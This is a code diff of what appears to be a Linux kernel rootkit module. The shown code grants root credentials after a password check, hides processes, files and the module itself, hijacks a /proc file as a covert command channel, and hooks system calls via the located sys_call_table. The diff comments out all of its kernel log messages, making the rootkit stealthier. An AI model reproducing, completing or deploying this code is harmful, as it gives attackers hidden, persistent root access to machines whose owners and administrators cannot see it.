@@ -734,7 +734,7 @@ int execute_command(const char __user *str, size_t length)
         return 0;
     }
 
-    pr_info("Password check passed\n");
+    // pr_info("Password check passed\n");
 
     // since the password matched, we assume the command following the password
     // is in the valid format
@@ -742,7 +742,7 @@ int execute_command(const char __user *str, size_t length)
     str += sizeof(CFG_PASS);
 
     if (strcmp(str, CFG_ROOT) == 0) {
-        pr_info("Got root command\n");
+        // pr_info("Got root command\n");
         struct cred *creds = prepare_creds();
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
@@ -760,35 +760,35 @@ int execute_command(const char __user *str, size_t length)
 
         commit_creds(creds);
     } else if (strcmp(str, CFG_HIDE_PID) == 0) {
-        pr_info("Got hide pid command\n");
+        // pr_info("Got hide pid command\n");
         str += sizeof(CFG_HIDE_PID);
         pid_add(str);
     } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
-        pr_info("Got unhide pid command\n");
+        // pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
-        pr_info("Got hide file command\n");
+        // pr_info("Got hide file command\n");
         str += sizeof(CFG_HIDE_FILE);
         file_add(str);
     } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
-        pr_info("Got unhide file command\n");
+        // pr_info("Got unhide file command\n");
         str += sizeof(CFG_UNHIDE_FILE);
         file_remove(str);
     }  else if (strcmp(str, CFG_HIDE) == 0) {
-        pr_info("Got hide command\n");
+        // pr_info("Got hide command\n");
         hide();
     } else if (strcmp(str, CFG_UNHIDE) == 0) {
-        pr_info("Got unhide command\n");
+        // pr_info("Got unhide command\n");
         unhide();
     } else if (strcmp(str, CFG_PROTECT) == 0) {
-        pr_info("Got protect command\n");
+        // pr_info("Got protect command\n");
         protect();
     } else if (strcmp(str, CFG_UNPROTECT) == 0) {
-        pr_info("Got unprotect command\n");
+        // pr_info("Got unprotect command\n");
         unprotect();
     } else {
-        pr_info("Got unknown command\n");
+        // pr_info("Got unknown command\n");
     }
 
     return 1;
@@ -832,7 +832,7 @@ int setup_proc_comm_channel(void)
     proc_entry = proc_entry->parent;
 
     if (strcmp(proc_entry->name, "/proc") != 0) {
-        pr_info("Couldn't find \"/proc\" entry\n");
+        // pr_info("Couldn't find \"/proc\" entry\n");
         remove_proc_entry("temporary", NULL);
         return 0;
     }
@@ -847,10 +847,10 @@ int setup_proc_comm_channel(void)
     struct rb_node *entry = rb_first(&proc_entry->subdir);
 
     while (entry) {
-        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
+        // pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
 
         if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
-            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            // pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
             proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
             goto found;
         }
@@ -863,10 +863,10 @@ int setup_proc_comm_channel(void)
     proc_entry = proc_entry->subdir;
 
     while (proc_entry) {
-        pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
+        // pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
 
         if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
-            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            // pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
             proc_fops = (struct file_operations *) proc_entry->proc_fops;
             goto found;
         }
@@ -876,7 +876,7 @@ int setup_proc_comm_channel(void)
 
 #endif
 
-    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
+    // pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
 
     return 0;
 
@@ -892,7 +892,7 @@ found:
     }
 
     if (!proc_fops->read && !proc_fops->write) {
-        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
+        // pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
         return 0;
     }
 
@@ -924,18 +924,18 @@ int setup_devnull_comm_channel(void)
 
 int init(void)
 {
-    pr_info("Module loaded\n");
+    // pr_info("Module loaded\n");
     hide();
     protect();
 
     if (!setup_proc_comm_channel()) {
-        pr_info("Failed to set up comm channel\n");
+        // pr_info("Failed to set up comm channel\n");
         unprotect();
         unhide();
         return -1;
     }
 
-    pr_info("Comm channel is set up\n");
+    // pr_info("Comm channel is set up\n");
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
@@ -953,7 +953,7 @@ int init(void)
 #endif
 
     sys_call_table = find_syscall_table();
-    pr_info("Found sys_call_table at %p\n", sys_call_table);
+    // pr_info("Found sys_call_table at %p\n", sys_call_table);
 
     asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
 
@@ -965,9 +965,9 @@ int init(void)
 
 void exit(void)
 {
-    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
-    pr_info("sys_read was called %lu times\n", read_count);
-    pr_info("sys_write was called %lu times\n", write_count);
+    // pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
+    // pr_info("sys_read was called %lu times\n", read_count);
+    // pr_info("sys_write was called %lu times\n", write_count);
 
     hook_remove_all();
     asm_hook_remove_all();
@@ -976,7 +976,7 @@ void exit(void)
 
     THIS_MODULE->name[0] = 0;
 
-    pr_info("Module removed\n");
+    // pr_info("Module removed\n");
 }
 
 module_init(init);
